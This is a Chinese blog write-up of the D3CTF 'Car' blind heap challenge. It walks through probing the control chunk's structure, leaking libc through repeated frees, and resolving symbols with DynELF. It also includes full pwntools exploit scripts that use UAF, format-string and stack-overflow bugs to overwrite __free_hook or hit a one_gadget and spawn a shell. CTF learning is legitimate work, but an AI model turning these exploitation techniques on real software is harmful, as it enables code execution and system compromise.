---
title: How 2 Blind Pwn
date: 2019-12-16 15:13:55
tags: awd
---
线下赛中挺好的一题/D3CTF/Car
<!--more-->
# prologue 
主要记录一下这题中学到的姿势...感觉打比赛学的知识好多...这题是一题盲打堆题.

# 比赛时做题记录
1. 第一天的时候10分钟左右泄漏地址发现末尾也为`0xca0`直接用本地libc 算出基地址改`free_hook`->`system`..惨遭失败..
2. 然后犯了以下错误
   1. 没有去 测量控制块的大小..一直纠结于libc是不是对的..因为无法调试 导致浪费了很多时间在错误构造上 期间还走了很多弯路
   2. 当远端与预期不相符，提前crash时 没有去仔细检查当前构造是否正确。
   3. 想通过爆破基地址解题，没有考虑到自编译libc的可能
3. 大哥完成控制块的各个域功能测定,做到了任意地址读(这点很关键,目前我接触的盲pwn题目无一不需要可重复的任意地址泄漏.)
4. 尝试各种libc后失败转为DynELF解题但是因为一个致命的错误导致方法失败。
5. 第一天结束，第二天所有队伍可以SSH登陆，下载libc后7分钟完成exp.
6. 补漏洞方面多次checkdown...导致到最后为了不checkdown上了只更改了堆溢出于UAF依然会被2只队伍攻击.

# Blind-DynELF
第一步应该是搞清楚各个结构体大小和各个域的意义·.
## 控制块大小测定
```python
add(0,0x88)
add(1,0x88)
free(1)
free(0)
show(0)
```
得出值A
```python
add(0,0x88)
add(1,0x88)
free(0)
free(0)
show(0)
```
得出值B
控制块大小在题目没有其他对堆块操作的情况下为`A-B-0x90`得出为0x30相应的应该是`malloc(0x20)`或者`malloc(0x28)`
此处顺便可以泄漏`heap`地址虽然后面没什么用.
## libc内部地址泄漏
```python
add(0,0x88)
add(1,0x88)
for x in range(8):
    free(0)
show(0)
```
然后就可以得到libc基地址...然后就可以尝试无效.
这时候就不能死磕要去找任意地址泄漏.
## LEAK
通过之前一题`stack`的盲打题目和这题的体验,`LEAK`的重要性不言而喻.
没有可重复的任意地址读做盲打是真正的瞎子.
根据此题的特性我们需要控制控制块的`ptr`指针，于是需要测定各个区域意义.过程如下。
```python
add(0,0x28)
add(1,0x88)
free(0)
add(2,0x88)
add(3,0x88)#Get the control chunk of car 0
```
此时就可以一个域一个域地覆盖然后通过`show(0)`得到一下结构体.
```s
0x00: type
0x08: color
0x10: size
0x18: ptr
0x20: ---
```
这时候结合前面的`libc`内指针泄漏就可以使用`DynELF`.
emm还有个注意的点我发现`libc`可写段的地址在`DynELF`时不如其`code segment`的地址好用当然如果有`binary`同样的....这个挺玄的不行就加加减减..反正不要卡住就可以.
这里记录一下找了一下午的错误...在`leak`的时候最好设置一个标志..或者`readuntil`的时候的参数长一点否则就会导致得到错误数据.....这个tip虽然很短但是教训很深刻...

之后就可以`look_up`各个函数了...之后的事情就比较简单了.这里是`DynELF`脚本.
```python
from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx,size,c='A',tp=1,color=1):
	cmd(1)
	cmd(tp)
	cmd(color)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	p.sendlineafter(": ",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c='A'):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	cmd(2)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	cmd(3)
def show(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
def leak(addr):
	edit(3,0x28,p64(3)*2+p64(0x100)+p64(addr))
	show(0)
	p.readuntil("ti: ")
	data=p.readuntil("\n===")[:-4]
	if len(data)==0:
		return '\0'
	else:
		#print data
		return data
#context.log_level='debug'
context.arch='amd64'
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
p=remote('0.0.0.0',1024)
p.sendlineafter(": ","n132")
p.sendlineafter(": ","n132")
add(0,0x88)
add(1,0x38)
for x in range(2):
	free(0)
show(0)
p.readuntil("ti: ")
heap=u64(p.readline()[:-1]+'\0\0')-0x6d0
log.warning(hex(heap))
for x in range(6):
	free(0)
show(0)
p.readuntil("ti: ")
base=u64(p.readline()[:-1]+'\0\0')
log.warning(hex(base))
add(2,0x88,p64(0)+"AAAABBBB",0,0)
free(1)
add(3,0x28,p64(3)*2+p64(0x100)+p64(-478*8+base))
pie=u64(leak(base-478*8)[:8].ljust(8,'\x00'))
pie=(pie&0xfffffffffffff000)-0x202000
d=DynELF(leak,pie)
sys=d.lookup("system",'libc')
hook=d.lookup("__free_hook",'libc')
log.warning(hex(hook))
#log.warning(hex(base-0x70-libc.sym['__malloc_hook']+libc.sym['__free_hook']))
log.warning(hex(sys))
#log.warning(hex(base-0x70-libc.sym['__malloc_hook']+libc.sym['system']))

#print addr
#log.warning(hex(addr))
#log.warning(hex(u64(leak()[:8].ljust(8,'\x00'))))
#for x in range(-0x300,0x1000):
#	print hex(u64(leak(base+x*8)[:8].ljust(8,'\x00')))+":idx="+str(x)
p.interactive()
```
感觉平时感觉很没用的东西有时候会特别有用... 就像刚学`shellcode`的时候和刚学`DynELF`的时候

# ATK (获得binary后)
题目出的挺好的,我发现的明显的漏洞有: 
1. main函数中的2个溢出因为本题没有正常推出的途径所以我感觉这里应该不足以单独构成完整exp.
2. sell 函数中的UAF.
3. Modify函数中的栈溢出.
4. Modify函数中的格式化字符串.
5. Modify函数中size比较的类型设置错误不过我目前是没有办法利用因为后面有`memcpy`...

其中1/5 我暂时没有利用的想法...这里把另外三个的exp放一下。

UAF:
```python
from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx,size,c='A',tp=1,color=1):
	cmd(1)
	cmd(tp)
	cmd(color)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	p.sendlineafter(": ",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c='A'):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	cmd(2)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	cmd(3)
def show(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
def leak(addr):
	edit(3,0x28,p64(3)*2+p64(0x100)+p64(addr))
	show(0)
	p.readuntil("ti: ")
	data=p.readuntil("\n===")[:-4]
	if len(data)==0:
		return '\0'
	else:
		#print data
		return data
#context.log_level='debug'
context.arch='amd64'
libc=ELF('./libc.so')
#p=remote('0.0.0.0',1024)
p=process("./car",env={"LD_PRELOAD":"./libc.so"})
p.sendlineafter(": ","n132")
p.sendlineafter(": ","n132")
add(0,0x88)
add(1,0x38)
for x in range(2):
	free(0)
show(0)
p.readuntil("ti: ")
heap=u64(p.readline()[:-1]+'\0\0')-0x6d0
log.warning(hex(heap))
for x in range(6):
	free(0)
show(0)
p.readuntil("ti: ")
base=u64(p.readline()[:-1]+'\0\0')
base=base-0x70-libc.sym['__malloc_hook']
log.warning(hex(base))
libc.address=base
edit(0,0x88,p64(libc.sym['__free_hook']-8))
add(2,0x88)
free(1)

#gdb.attach(p)
add(3,0x88,"/bin/sh\x00"+p64(libc.sym["system"]))
free(3)
p.interactive()
```

fmtstr:
```python
from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx,size,c='A',tp=1,color=1):
	cmd(1)
	cmd(tp)
	cmd(color)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	p.sendlineafter(": ",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c='A'):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	cmd(2)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)

def show(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
context.log_level='debug'
context.arch='amd64'
libc=ELF('./libc.so')
p=process("./car",env={"LD_PRELOAD":"./libc.so"})
p.sendlineafter(": ","n132")
p.sendlineafter(": ","n132")
add(0,0x100)
add(1,0x8,'/bin/sh\x00')
edit(0,0x100,"%3$p|\x00")
base=int(p.readuntil("|")[:-1],16)-(0x7ffff7b05641-0x7ffff7a21000)
log.warning(hex(base))
libc.address=base
cmd(3)
gdb.attach(p,'b *0x000555555555810')
sys=libc.sym['system']
p1=sys&0xffff
p2=(sys>>16)&0xffff
p3=(sys>>32)&0xffff
def cal(a,b):
	if b>a:
		return b-a
	else:
		return b-a+0x10000
edit(0,0x100,"%{}c%16$hn%{}c%17$hn%{}c%18$hn\x00".format(p1,cal(p1,p2),cal(p2,p3)).ljust(0x30)+p64(libc.sym['__free_hook'])+p64(libc.sym['__free_hook']+2)+p64(libc.sym['__free_hook']+4))
cmd(3)
free(1)
p.interactive()
```

# stack_overflow
```python
from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx,size,c='A',tp=1,color=1):
	cmd(1)
	cmd(tp)
	cmd(color)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	p.sendlineafter(": ",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c='A'):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	cmd(2)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)

def show(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
context.log_level='debug'
context.arch='amd64'
libc=ELF('./libc.so')
p=process("./car",env={"LD_PRELOAD":"./libc.so"})
p.sendlineafter(": ","n132")
p.sendlineafter(": ","n132")
add(0,0x200)
add(1,0x200)
add(2,0x200)

edit(0,0x38,"A"*0x30)
p.readuntil("A"*0x30)
base=u64(p.readuntil(" g")[:-2]+'\0\0')-(0x7ffff7dd07e3-0x7ffff7a21000)
cmd(3)
edit(1,0xf9,"A"*0xf9)
p.readuntil("A"*0xf9)
canary=u64('\0'+p.read(7))
cmd(2)

p.sendlineafter(": ",str(0xf9))
p.sendafter(": ","A"*0xf8+'\x00')
cmd(3)

one=0x4161a+base
gdb.attach(p,'b *0x00055555555586E')
edit(2,0x188,"A"*0xf8+p64(canary)+p64(0xdeadbeef)+p64(one)+'\x00'*0x78)
log.warning(hex(base))
log.warning(hex(canary))
cmd(3)
p.interactive()
```

# summary
因为最近要期末了所以总结地比较匆忙.在师傅们那边学到了不少...积累了实战经验..
出题师傅出的是非常好的有非常多可以玩的东西.这题patch过程中也学到了不少...之后再总结一篇patch相关的吧..